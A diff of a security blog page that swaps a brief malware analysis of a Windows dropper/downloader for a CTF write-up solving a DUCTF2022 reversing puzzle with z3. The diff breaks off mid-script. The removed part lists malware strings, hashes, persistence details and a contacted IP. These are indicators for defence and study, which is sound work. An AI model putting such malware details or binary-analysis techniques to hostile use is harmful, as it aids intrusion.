@@ -6,10 +6,10 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <title>A quick Look at a Dropper and Downloader</title>
-  <meta name='description' content='Just a random quick analysis of a recent sample that was uploaded on VirusTotal. The first ever in this blog at least ...'>
+  <title>Trying out z3 Solver (DUCTF2022 - EZPZ RE + pwn)</title>
+  <meta name='description' content='I have always wanted to give z3 solver a try and had decided to use this for solving Ezpz from DUCTF2022.'>
 
-  <link rel="canonical" href="http://0.0.0.0:4000/2023/03/11/A_quick_peek_at_a_dropper_and_downloader/">
+  <link rel="canonical" href="http://0.0.0.0:4000/2022/09/25/Trying_out_z3_solver_(_DUCTF2022-EZPZ-rev-pwn)/">
   <link rel="alternate" type="application/rss+xml" title="Malware Owl" href="/feed.xml">
 
   <!-- Fonts -->
@@ -218,7 +218,7 @@
       
       <div class="col col-6 col-t-12">
         <div class="image-box">
-          <img class="post-image lazy" data-src="/images/flash_analysis_1/326d26f624af4b02bae8b528cdce9752.png" alt="A quick Look at a Dropper and Downloader">
+          <img class="post-image lazy" data-src="/images/ductf2022ezpz/postpicture.png" alt="Trying out z3 Solver (DUCTF2022 - EZPZ RE + pwn)">
         </div>
       </div>
       
@@ -230,14 +230,14 @@
             <span class="post__minutes">
               
               
-                6 min read
+                16 min read
               
               <time class="post__date"
-                datetime="2023-03-11T09:54:00+00:00">Mar 11, 2023</time>
+                datetime="2022-09-25T19:08:00+00:00">Sep 25, 2022</time>
             </span>
           </div>
         
-          <h2 class="post__title">A quick Look at a Dropper and Downloader</h2>
+          <h2 class="post__title">Trying out z3 Solver (DUCTF2022 - EZPZ RE + pwn)</h2>
         
           <div class="post__bottom">
         
@@ -252,9 +252,9 @@
               <span>in</span>
               <span class="post-tags">
                 
-                <a href="/tag/QuickPeek" class="post__tag">QuickPeek</a>
+                <a href="/tag/Writeups" class="post__tag">Writeups</a>
                 
-                <a href="/tag/MalwareAnalysis" class="post__tag">MalwareAnalysis</a>
+                <a href="/tag/CTF" class="post__tag">CTF</a>
                 
               </span>
               
@@ -272,276 +272,417 @@
   <article class="post animate">
 
     <div class="post__content">
-      <h1 id="quick-malware-analysis">Quick Malware Analysis</h1>
+      <h1 id="trying-out-z3-solver-ductf2022---ezpz-re--pwn">Trying out z3 Solver (DUCTF2022 - EZPZ RE + pwn)</h1>
 
-<h2 id="sample">Sample</h2>
+<h2 id="description">Description</h2>
+<p>Recently, I have started to play CTF. When doing big reverse engineering work, especially where parts may contain many arithmetic operations like when creating KeyGen, I believe that z3 is a really useful with the analysis. And since this is my first time trying out the Z3 Theorem Prover, I think it would be nice to note that down as part of my journey!</p>
 
-<p>As of 11 March 2023, I have tried the following search in VirusTotal
-<img src="/images/flash_analysis_1/bb183d4fe39440a8a01cfff28f8520dc.png" alt="bb183d4fe39440a8a01cfff28f8520dc.png" /></p>
+<p>In this post, I will deal mostly with the reversing and z3, but will not go too much into details about the pwning part since its a typical <code class="language-plaintext highlighter-rouge">gets</code> and ret2libc type challenge with a relatively old libc version. Also, I will go through the decompiled code with my renamed variable names which I hope is accurate.</p>
 
-<h3 id="hash">Hash:</h3>
+<h2 id="lets-begin--ezpz-rev-">Let’s Begin ( EZPZ-REV )</h2>
 
-<div class="table-container">
-  <table> 
-    <tr><th>Name : </th><th>dttcodexgigas.fe8ce2ec2b71cc3ddceb1ddee6ee7cdcf311bfc3.exe</th></tr>
-    <tr><th> Hash : </th><th>7703278ce4c812de42c720928689b5cd5976270057dcfb512c9905d1ae7307d3</th></tr>
-  </table>
-</div>
+<p>When trying out the application, there were no outputs and was expected to put in any values. So, for short and incorrect values, we get the string “Incorrect!” and when we input long string, we get Segmentation Fault.</p>
 
-<p><br /></p>
+<p><img src="/images/ductf2022ezpz/segfault.png" alt="segfault.png" /></p>
 
-<p><img src="/images/flash_analysis_1/7db4dd9bfc334a69a35c545c79f6e607.png" alt="7db4dd9bfc334a69a35c545c79f6e607.png" /></p>
+<p><em>Testing inputs</em></p>
 
-<h2 id="static-analysis">Static Analysis</h2>
+<p>After some reverse engineering and reformatting, we observe that there are 4 conditions that we need to meet before the flag is read and printed out.</p>
 
-<h3 id="floss">FLOSS</h3>
-<p>Firstly, from Flare’s Floss program it shows some interesting strings that might give an insight to what this malware might be doing.</p>
+<p><img src="/images/ductf2022ezpz/main_function.png" alt="/images/ductf2022ezpz" /></p>
 
-<p>It seems to indicate some things:</p>
-<ol>
-  <li>Persistence via the Run key</li>
-  <li>Commands are run within this binary via <code class="language-plaintext highlighter-rouge">ShellExecuteExA</code> from <code class="language-plaintext highlighter-rouge">Shell32.dll</code></li>
-  <li>Internet Requests are made since headers are found
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Accept: */*
-0x06065 Content-Type: application/x-www-form-urlencoded
-0x06096 Accept-Language: zh-cn
-0x060ae Connection: Keep-Alive
-0x060c8 Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; CIBA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)
-</code></pre></div>    </div>
-  </li>
-  <li>Language Accepted : Chinese</li>
-  <li>MAC address may be collected due to <code class="language-plaintext highlighter-rouge">%s?mac=%02X-%02X-%02X-%02X-%02X-%02X</code></li>
-  <li><code class="language-plaintext highlighter-rouge">pomdfghrt</code> which is actually the mutex name.</li>
-  <li><code class="language-plaintext highlighter-rouge">a.exe</code> string may be obfuscated for some reason since this value is found in the stack string after analysis by FLOSS.</li>
-  <li>It looks like some usersname were targetted including :
-    <ol>
-      <li>Steve</li>
-      <li>George</li>
-      <li>r.vult</li>
-      <li>Joe Cage</li>
-      <li>Azure</li>
-      <li>Linky</li>
-      <li>Maxine</li>
-    </ol>
-  </li>
-  <li>It seems like it contains hashes for other malware with the same name <code class="language-plaintext highlighter-rouge">microsofthelp.exe</code> which sounds like another variant
-    <ol>
-      <li><code class="language-plaintext highlighter-rouge">microsofthelp.exe</code> - https://www.virustotal.com/gui/file/55426c9354510bb58c019a650dad82cb7b98defab142216ddc304656b95ff227/details</li>
-      <li><code class="language-plaintext highlighter-rouge">9b5e3f2ea0756b11df0cef72d7d9d2ac.virus</code> - https://www.virustotal.com/gui/file/9c79a9fb8823c0cc3a7bfd5b64d16ab500d4149710d00cf8a9ed0482328c2e9d/details
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x13680 C:\b54f9e2c8cef73c8aa7d0f460440473750131b7d204d3c01462aa8c0cb72e1c6
-0x13784 C:\99c053e614af4cea25d1d767f81808b3addb07e356392383c6e4cb706bb98736
-0x13888 C:\18becc5102637cdfdfd664cc0c4fee3033a146ba8d86dbf1c36c4b84f3b380d3
-0x1398c C:\Users\maxine\AppData\Local\Temp\file.exe
-0x13a90 C:\Users\azure\Downloads\cee266d388403e0dfbfdf00003c005b1.virus.exe
-0x13b94 C:\940ed5075fc8ae3a4d61e08016d11c66f72dee5330a8f17a8e581a39f0d6d72f
-0x13c98 C:\Users\george\Desktop\microsofthelp.exe
-0x13d9c C:\Users\r.vult\AppData\Local\Temp\acb7049b9bf5be1991491685c7fddd1b.exe
-0x13ea0 C:\Users\george\Desktop\microsofthelp.exe
-0x13fa4 C:\Users\r.vult\AppData\Local\Temp\acb7049b9bf5be1991491685c7fddd1b.exe
-0x140a8 C:\Users\george\Desktop\microsofthelp.exe
-0x141ac C:\Users\Steve\AppData\Local\Temp\47c2e9ad6d8748ae8987.exe
-0x142b0 C:\Users\r.vult\AppData\Local\Temp\f6a91ed10db4f8ee38f97e21f091004f.deda3a5d16ec9e2db06f8704628917335556e29b
-0x143b4 C:\12c04286dd6b93d09e883f873b3aece8d5ca2e2caeece785aed7ef1e684b0e4e
-0x144b8 C:\Users\azure\Downloads\microsofthelp.exe
-0x145bc C:\WINDOWS\STUB.exe
-0x146c0 C:\Users\Joe Cage\Desktop\rl_file.exe
-0x147c4 C:\Users\azure\Downloads\9f1b0514f2f8ef670de7f0ea22a78d23.virus.exe
-0x148c8 C:\WINDOWS\STUB.exe
-0x149cc C:\Users\george\Desktop\software.exe
-0x14ad0 C:\WINDOWS\STUB.exe
-0x14bd4 C:\Users\george\Desktop\program.exe
-0x14cd8 C:\WINDOWS\STUB.exe
-0x14ddc C:\Users\george\Desktop\software.exe
-0x14ee0 C:\WINDOWS\STUB.exe
-0x14fe4 C:\Users\Steve\AppData\Local\Temp\8af45fe33ca1a5558b10.exe
-0x150e8 C:\Users\azure\Downloads\dttcodexgigas.fe8ce2ec2b71cc3ddceb1ddee6ee7cdcf311bfc3.exe
-0x151ec C:\1974a6409179db72018c3a8cebc1b9f1ecc4b70b1965171a70d5b301b48dc8ef
-0x152f0 C:\Users\Linky\AppData\Local\Temp\6e30ca9d7c176fad4ea1.exe
-0x153f4 C:\WINDOWS\STUB.exe
-0x154f8 C:\Users\azure\Downloads\e8706ac38626fff3fa2194cbce2a0e63.virus.exe
-0x155fc C:\WINDOWS\STUB.exe
-0x15700 C:\9c79a9fb8823c0cc3a7bfd5b64d16ab500d4149710d00cf8a9ed0482328c2e9d
-0x15804 C:\55426c9354510bb58c019a650dad82cb7b98defab142216ddc304656b95ff227
-0x15908 C:\Users\azure\Downloads\microsofthelp.exe
-0x15a0c C:\WINDOWS\STUB.exe
-0x15b10 C:\Users\azure\Downloads\2e9f7f2aa4113e839694cd89635b28ff.virus.exe
-0x15c14 C:\WINDOWS\STUB.exe
-0x15d18 C:\Users\r.vult\AppData\Local\Temp\7bbf2a3df85e498d4e19cfbe99795f52.virus
-0x15e1c C:\Users\azure\Downloads\microsofthelp.exe
-0x15f20 C:\Users\Linky\AppData\Local\Temp\4e5a7716714edc08e4e9.exe
-</code></pre></div>        </div>
-      </li>
-    </ol>
-  </li>
-</ol>
+<p>One thing to note, the result from of the long string that was passed into the function can be treated as a hardcoded value via reading the value dynamically.</p>
 
-<p>Some other interesting strings that may be used for hunting includes</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Software\motherFucker
+<h2 id="condition-1">Condition 1</h2>
 
-GetStringTypeALCMapStringWWaitForSingleObjectCreateThreadHeapFreeDeleteFileAExitProcesslstrcmpiAlstrcatAGetWindowsDirectoryAHeapAllocGetProcessHeapSleepGetModuleFileNameACloseHandleGetLastErrorCreateMutexAGetProcAddressLoadLibraryAHeapReAllocGetTickCountFindCloseFindFirstFileATerminateProcessCreateProcessACreateFileAReadFileWriteFileFlushFileBuffersGetFileSizeLCMapStringAGetStringTypeWMultiByteToWideCharGetOEMCPGetACPGetCPInfoRtlUnwindSetUnhandledExceptionFilterIsBadReadPtrIsBadWritePtrIsBadCodePtrGetCurrentProcessGetStdHandleWideCharToMultiByteRegSetValueExARegQueryValueExARegOpenKeyExARegCreateKeyARegOpenKeyARegCloseKeyGetAdaptersInfoInternetOpenAInternetSetOptionExAInternetOpenUrlAInternetCloseHandleInternetReadFilewsprintfA
+<p><img src="/images/ductf2022ezpz/condition1.png" alt="cond1" /></p>
 
-B&amp;C:\Documents and Settings\Administrator\My Documents\My Music\QvodSetup5.exe
+<p>In the first condition, it accepts the puzzle input as a 1D array which is calculated as a 2D array. It checks every row ( in steps of 14 ). For each row, it will see if the puzzle cell contains the value ‘1’. Finally, number of value ‘1’s must be 3.</p>
 
-C:\_dWlLXez.exe
+<p>Now, we can start the script for the first condition. We first create the <code class="language-plaintext highlighter-rouge">Solver</code> object added the constraints of value being 1 and 0. Also, the puzzle cells values should be followed and therefore, the list comprehension is there to indicate to the solver the puzzle cells are the value we are trying to solve. At the end of writing the condition, we add another constraint that the number of ones should be 3. The reason that we can add puzzle cell directly is because of the first constraint of values being integer 1 or integer 0.</p>
 
-C:\runme.exe
+<p><img src="/images/ductf2022ezpz/z3_cond1.png" alt="z3_cond1.png" /></p>
 
-C:\vshsn.exe
+<h2 id="condition-2">Condition 2</h2>
 
-0x13680 C:\b54f9e2c8cef73c8aa7d0f460440473750131b7d204d3c01462aa8c0cb72e1c6
-0x13784 C:\99c053e614af4cea25d1d767f81808b3addb07e356392383c6e4cb706bb98736
-0x13888 C:\18becc5102637cdfdfd664cc0c4fee3033a146ba8d86dbf1c36c4b84f3b380d3
-0x1398c C:\Users\maxine\AppData\Local\Temp\file.exe
-0x13a90 C:\Users\azure\Downloads\cee266d388403e0dfbfdf00003c005b1.virus.exe
-0x13b94 C:\940ed5075fc8ae3a4d61e08016d11c66f72dee5330a8f17a8e581a39f0d6d72f
-0x13c98 C:\Users\george\Desktop\microsofthelp.exe
-0x13d9c C:\Users\r.vult\AppData\Local\Temp\acb7049b9bf5be1991491685c7fddd1b.exe
-0x13ea0 C:\Users\george\Desktop\microsofthelp.exe
-0x13fa4 C:\Users\r.vult\AppData\Local\Temp\acb7049b9bf5be1991491685c7fddd1b.exe
-0x140a8 C:\Users\george\Desktop\microsofthelp.exe
-0x141ac C:\Users\Steve\AppData\Local\Temp\47c2e9ad6d8748ae8987.exe
-0x142b0 C:\Users\r.vult\AppData\Local\Temp\f6a91ed10db4f8ee38f97e21f091004f.deda3a5d16ec9e2db06f8704628917335556e29b
-0x143b4 C:\12c04286dd6b93d09e883f873b3aece8d5ca2e2caeece785aed7ef1e684b0e4e
-0x144b8 C:\Users\azure\Downloads\microsofthelp.exe
-0x145bc C:\WINDOWS\STUB.exe
-0x146c0 C:\Users\Joe Cage\Desktop\rl_file.exe
-0x147c4 C:\Users\azure\Downloads\9f1b0514f2f8ef670de7f0ea22a78d23.virus.exe
-0x148c8 C:\WINDOWS\STUB.exe
-0x149cc C:\Users\george\Desktop\software.exe
-0x14ad0 C:\WINDOWS\STUB.exe
-0x14bd4 C:\Users\george\Desktop\program.exe
-0x14cd8 C:\WINDOWS\STUB.exe
-0x14ddc C:\Users\george\Desktop\software.exe
-0x14ee0 C:\WINDOWS\STUB.exe
-0x14fe4 C:\Users\Steve\AppData\Local\Temp\8af45fe33ca1a5558b10.exe
-0x150e8 C:\Users\azure\Downloads\dttcodexgigas.fe8ce2ec2b71cc3ddceb1ddee6ee7cdcf311bfc3.exe
-0x151ec C:\1974a6409179db72018c3a8cebc1b9f1ecc4b70b1965171a70d5b301b48dc8ef
-0x152f0 C:\Users\Linky\AppData\Local\Temp\6e30ca9d7c176fad4ea1.exe
-0x153f4 C:\WINDOWS\STUB.exe
-0x154f8 C:\Users\azure\Downloads\e8706ac38626fff3fa2194cbce2a0e63.virus.exe
-0x155fc C:\WINDOWS\STUB.exe
-0x15700 C:\9c79a9fb8823c0cc3a7bfd5b64d16ab500d4149710d00cf8a9ed0482328c2e9d
-0x15804 C:\55426c9354510bb58c019a650dad82cb7b98defab142216ddc304656b95ff227
-0x15908 C:\Users\azure\Downloads\microsofthelp.exe
-0x15a0c C:\WINDOWS\STUB.exe
-0x15b10 C:\Users\azure\Downloads\2e9f7f2aa4113e839694cd89635b28ff.virus.exe
-0x15c14 C:\WINDOWS\STUB.exe
-0x15d18 C:\Users\r.vult\AppData\Local\Temp\7bbf2a3df85e498d4e19cfbe99795f52.virus
-0x15e1c C:\Users\azure\Downloads\microsofthelp.exe
-0x15f20 C:\Users\Linky\AppData\Local\Temp\4e5a7716714edc08e4e9.exe
+<p><img src="/images/ductf2022ezpz/condition2.png" alt="condition2.png" /></p>
 
+<p>This function is highly similar in construct as condition 1. Instead, it will loop through each column cell to check of the number of value ‘1’s. Again, we see that if the number of ‘1’s is not three, then it will fail.</p>
+
+<p>Very similar to the previous condition, this is the script that helped satisfy the second condition.</p>
+
+<p><img src="/images/ductf2022ezpz/z3_cond2.png" alt="/images/ductf2022ezpz" /></p>
+
+<h2 id="condition-3">Condition 3</h2>
+
+<p><img src="/images/ductf2022ezpz/condition3.png" alt="cond3" /></p>
+
+<p>This condition is the only one that deals with the decoded string. This decoded string has length of 196. It’s value is used to map <code class="language-plaintext highlighter-rouge">idx</code> of the <code class="language-plaintext highlighter-rouge">result_store[idx]</code>. Ultimately, the each values in the result_store should contain the number 3.</p>
+
+<p>The mapping is basically :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'a'  ==  'a'-'a'  == 0
+'b'  ==  'b'-'a'  == 1
+'c'  ==  'c'-'a'  == 2
+...
+...
+'n'  ==  'n'-'a'  == 14
 </code></pre></div></div>
 
-<h3 id="capa">CAPA</h3>
-<p>With Flare’s CAPA, we can quickly identify that there is some unusual section name with the following format <code class="language-plaintext highlighter-rouge">nspX</code> where <code class="language-plaintext highlighter-rouge">X</code> is a number.
-<img src="/images/flash_analysis_1/1b4aedd436fa4cbabb0536ba115d8e0e.png" alt="1b4aedd436fa4cbabb0536ba115d8e0e.png" /></p>
+<p>To update the result_store entries :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    For each cell in the puzzle, 
+        if the value is '1'
+            add one to the `result_store[idx]`
+</code></pre></div></div>
 
-<p>This is the first time I have ever heard and came across NSP Packer.</p>
+<p>To check for correctness :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    For i in result_store:
+        i == 3 
+</code></pre></div></div>
 
-<h3 id="pe-bear">PE Bear</h3>
-<p>Off all the nsp section names, only nsp2 consists of all zeros. At this juncture, I believe that this is where the unpacked bytes would be located at. I may be wrong.</p>
+<p>With that, we can convert these into a script. After understanding the condition, we have to reverse this into a function and add the constraints.</p>
 
-<p><img src="/images/flash_analysis_1/eab3071ac99e4b529e312194aaa6f297.png" alt="eab3071ac99e4b529e312194aaa6f297.png" /></p>
+<p><img src="/images/ductf2022ezpz/z3_cond3.png" alt="/images/ductf2022ezpz" /></p>
 
-<p>We see that from this output, there are attempt to set persistence and also get common api like <code class="language-plaintext highlighter-rouge">GetProcessAddress</code> and <code class="language-plaintext highlighter-rouge">LoadLibrary</code>.</p>
+<h2 id="condition-4-last-condition">Condition 4 (Last condition)</h2>
+<p>Since I could not contain the decompiled code into one screenshot, I have dumped it here instead.</p>
 
-<h2 id="static-analysis-1">Static Analysis</h2>
-<h3 id="persistence">Persistence</h3>
-<p>As we suspected, it places the path of microsofthelp.exe into the run key in the registry
-<img src="/images/flash_analysis_1/b037901cf4ed4c25804d2003b722816e.png" alt="runkey.png" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__int64 __fastcall check_no_adjacent_ones_sub_4013B2(char *decoded, char *input_buffer)
+{
+  char *input; // rdi
+  int start_index; // er8
+  __int64 v4; // rbx
+  unsigned __int64 v5; // r10
+  unsigned int indexed_cell; // edx
+  int *index; // rcx
+  int index_; // edx
+  unsigned __int64 v9; // r10
+  __int64 column_idx; // rax
+  int index_array[8]; // [rsp+0h] [rbp-30h] BYREF
+  __int64 v13; // [rsp+20h] [rbp-10h] BYREF
 
-<h3 id="to-further-debug">To Further debug,</h3>
+  input = input_buffer;
+  start_index = 0;
+  v4 = 0x10004001LL;
+  while ( 2 )                                   // for each column in a row
+  {
+    for ( column_idx = 0LL; column_idx != 14; ++column_idx )
+    {
+      if ( input[column_idx] == '1' )           // if input_buffer value is 1
+      {
+        index_array[0] = -1;
+        index_array[1] = -15;
+        index_array[2] = -14;
+        index_array[3] = -13;
+        index_array[4] = 1;
+        index_array[5] = 15;
+        index_array[6] = 14;
+        index_array[7] = 13;
+        for ( index = index_array; &amp;v13 != (__int64 *)index; ++index )// for each of the specified numbers
+        {
+          index_ = *index;
+          if ( (_DWORD)column_idx )             // if not the first column of any row
+          {
+            if ( (_DWORD)column_idx == 13 )     // last entry in the row ( edge )
+            {
+              v9 = (unsigned int)(index_ + 13);
+              if ( (unsigned int)v9 &lt;= 0x1C )
+              {
+                if ( _bittest64(&amp;v4, v9) )      // test if it falls on  position 0, 14 or 28
+                  continue;
+              }
+            }
+          }
+          else                                  // if first column of any row
+          {
+            v5 = (unsigned int)(index_ + 15);
+            if ( (unsigned int)v5 &lt;= 0x1C &amp;&amp; _bittest64(&amp;v4, v5) )
+              continue;
+          }
+          indexed_cell = start_index + column_idx + index_;
+          // Within range and not 1
+          // this means that we are looking to see that there are no adjacent cell
+          // containing the value 1 if the current cell is holding the value of 1
+          if ( indexed_cell &lt;= 0xC3 &amp;&amp; input_buffer[indexed_cell] == '1' )
+            return 0LL;
+        }
+      }
+    }
+    start_index += 14;                          // go next row
+    input += 14;
+    if ( input != input_buffer + 196 )          // check end of puzzle
+      continue;
+    break;
+  }
+  return 1LL;
+}
+</code></pre></div></div>
 
-<p>Have to set settings to the path that it is looking out for. Or we can always patch. In this case, we choose the former.</p>
+<p>The index_array values are values used in calculation to see if the current cell that was processed is at the boundaries of the puzzle. This is important because the program is checking if the adjacent cells contains the value ‘1’ if current cell itself is containing the value ‘1’.</p>
 
-<p><img src="/images/flash_analysis_1/f5bf1db494ce44e095b5da6a18fbf6ad.png" alt="2_settings_to_debug_further.png" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000             000             100
+010             011             000 
+000             000             001
 
-<p>Only then will we be able to see the mutex being created.</p>
+PASS            FAIL            PASS
+</code></pre></div></div>
 
-<h3 id="fakenet-ng">Fakenet-ng</h3>
-<p>Using Fake net, we see that it attempts to connect to 239.255.255.250:3702.</p>
+<p>Also, we see the _bittest64 instruction was used in the assembly to check against the hex value 0x10004001. That is fancy way of checking if the value is either 0, 14 or 28.
+Now, if no value ‘1’s are adjacent to each other in all eight directions, then we pass this condition.</p>
 
-<p><img src="/images/flash_analysis_1/5e9a953f9a89425fb3b12684a61ae715.png" alt="3. outbound_traffic_attempt.png" /></p>
+<p>To represent this in the script, I have googled on how to <a href="https://www.geeksforgeeks.org/find-all-adjacent-elements-of-given-element-in-a-2d-array-or-matrix/">find all adjacent elements of given element in a 2d array or matrix</a> and I ended up adapting it into the script. I have also inlined the <code class="language-plaintext highlighter-rouge">isValidPos</code> from the post to fit the condition into one function.</p>
 
-<p>According to Mandiant, this URL has been found being used by Russian Speaking Threat Actor advertising access to South Korean Metal Company on exploit.in (Underground hacking forum that has been around and active since 2005) primarily targgeting customer’s data and Intellectual Properties. Just from this, it is still unclear that this sample has any corelation to that incident.</p>
+<p><img src="/images/ductf2022ezpz/z3_cond4.png" alt="z3_cond4.png" /></p>
 
-<p>According to Virus Total, it has been marked as malicious.</p>
+<p>At this point, we have all we need to make sure that the conditions are correct. To confirm that this is doable, we have to check for satisfiability and print out the evaluated puzzle cell values. The script will look like this.</p>
 
-<p><img src="/images/flash_analysis_1/9f864cdb27d34a95840a5debdea39e1e.png" alt="9f864cdb27d34a95840a5debdea39e1e.png" /></p>
+<p><img src="/images/ductf2022ezpz/evaluate.png" alt="image" /></p>
 
-<p>Some information about what we are going to see :</p>
-<blockquote>
-  <p>Downloaded files: latest files that have been retrieved from URLs sitting at the domain or IP address under study. Note that the date recorded in this section is not the date at which the file was downloaded but rather the date of the last report that we have for the resource.</p>
+<h1 id="the-solve-script">The Solve Script</h1>
 
-  <p>latest files that, through their execution in a sandboxed virtual environment, have been seen to perform some kind of communication with the IP address or domain under consideration.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">CTF</span><span class="o">/</span><span class="n">ductf2022</span><span class="o">/</span><span class="n">ezpz</span><span class="o">-</span><span class="n">rev</span><span class="o">-</span><span class="n">pwn</span><span class="c1"># cat solve.py 
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">z3</span> <span class="kn">import</span> <span class="o">*</span> 
+<span class="n">s</span> <span class="o">=</span> <span class="nc">Solver</span><span class="p">()</span>
 
-  <p>Files referring: VirusTotal will inspect the strings contained in files submitted to the service and apply certain regular expressions to these in order to identify domains and IP addresses. This section records files that have referenced the domain or IP address under consideration. Note that the date recorded in this section is not the date at which the file that give raise to the relationship was submitted but rather the date of the last report that we have for the resource.</p>
-</blockquote>
+<span class="k">def</span> <span class="nf">print_puzzle</span><span class="p">(</span><span class="n">puzzle</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">14</span><span class="o">*</span><span class="mi">14</span><span class="p">,</span><span class="mi">14</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">puzzle</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">14</span><span class="p">])</span>
 
-<p><img src="/images/flash_analysis_1/ffa5a2462bc94407acfb90fa30e8918b.png" alt="ffa5a2462bc94407acfb90fa30e8918b.png" /></p>
 
-<p>Note that this IP is not new. In the lower group of files, they are all marked with <code class="language-plaintext highlighter-rouge">Olympic Destroyer</code> .</p>
+<span class="c1"># check that each row and column has just three '1's each 
+</span>
+<span class="n">puzzle</span><span class="o">=</span> <span class="p">[</span><span class="nc">Int</span><span class="p">(</span><span class="sh">'</span><span class="s">puzzle_%s</span><span class="sh">'</span><span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="o">*</span><span class="mi">14</span><span class="p">)]</span>
+<span class="c1"># make sure all value sin the puzzle are either 0 or 1
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="o">*</span><span class="mi">14</span><span class="p">):</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">puzzle</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;=</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">puzzle</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
 
-<p>The upper group consists of many different types of malware:</p>
-<ul>
-  <li>Grayware</li>
-  <li>Phishing PDFs</li>
-  <li>Downloaders</li>
-  <li>Spreaders</li>
-</ul>
+<span class="c1"># sub_401239
+</span><span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+    <span class="n">count_each_row</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+        <span class="n">count_each_row</span> <span class="o">+=</span> <span class="n">puzzle</span><span class="p">[</span><span class="n">r</span><span class="o">*</span><span class="mi">14</span><span class="o">+</span><span class="n">c</span><span class="p">]</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">count_each_row</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
 
-<h1 id="summary">Summary</h1>
+<span class="c1"># sub_40129E
+</span><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+    <span class="n">count_each_column</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+        <span class="n">count_each_column</span> <span class="o">+=</span>  <span class="n">puzzle</span><span class="p">[</span><span class="n">c</span> <span class="o">+</span> <span class="n">r</span><span class="o">*</span><span class="mi">14</span><span class="p">]</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">count_each_column</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
 
-<p>As I do not have communication with C2 server, I am not able to retrieve the data from it and therefore am not able to go perform a deep dive into the payload :( However, we are still able to suggest that this sample specifically acts as both dropper and downloader!.</p>
+<span class="n">decoded_value</span> <span class="o">=</span> <span class="sh">"</span><span class="s">aaaaabbbbcccddaaaaabbbbccccdaaeaaabbbccccdaaefaabbbcccgdeeefffffbccggdfeeffffggggggdfffffffhhhgggdffffhhhhhhgggdffijjjjhkkllmdiiijjkkkkkllmmiijjjkkkklllmmiijjjkkkklllmmijjjjjkknnllmmijjjjnnnnnllll</span><span class="sh">"</span>
 
-<p>Based on VirusTotal relation graph, there is a high probability that this can be used to drop <code class="language-plaintext highlighter-rouge">Olympic Destroyer</code> malware into the Victim’s PC.</p>
 
-<p>To end it off, here is the rough flow of event :</p>
 
-<p><img src="/images/flash_analysis_1/326d26f624af4b02bae8b528cdce9752.png" alt="326d26f624af4b02bae8b528cdce9752.png" /></p>
+<span class="c1"># this is to store to the correct store idx when it meets store_idx + ord('a')
+# for those that has value of '1', check the index at the decoded_value and store them in 
+# the result_store. Each entries in the result store shoudl be 3 each or it will fail
+</span><span class="sh">"""</span><span class="s">
+    // if decoded idx is </span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="s"> then store at index 0 in result_store
+    // if decoded idx is </span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span><span class="s"> then store at index 1 in result_store 
+    // ...
+    // ...
+</span><span class="sh">"""</span>
+<span class="k">for</span> <span class="n">store_idx</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="o">*</span><span class="mi">14</span><span class="p">):</span> <span class="c1"># For all puzzle cells , also the size of decoded value
